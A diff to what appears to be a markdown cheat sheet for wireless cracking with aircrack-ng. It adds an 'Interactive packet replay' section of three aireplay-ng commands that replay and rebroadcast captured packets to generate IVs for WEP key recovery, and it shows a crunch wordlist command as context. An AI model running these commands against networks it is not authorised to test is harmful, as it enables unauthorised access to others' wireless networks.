@@ -89,6 +89,46 @@ Aircrack often uses brute force with some other tools as follows:
 crunch [min] [max] [charset] -t [pattern] -o [path file]
 ```
 
+## Interactive packet replay
+
+Natural Packet Replay
+
+```
+aireplay-ng -2 -b 00:14:6C:7E:40:80 -d 00:09:5B:EB:C5:2B -t 1 mon0
+Use this packet ? y
+```
+
+Modified Packet Replay
+
+```
+aireplay-ng -2 -b 00:14:6C:7E:40:80 -t 1 -c 00:09:5B:EB:C5:2B -p 0841 mon0
+Use this packet ? y
+```
+
+Rebroadcast the packet and thereby generate new IVs
+
+```
+aireplay-ng -2 -p 0841 -c 00:09:5B:EB:C5:2B -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82  mon0
+Use this packet ? y
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
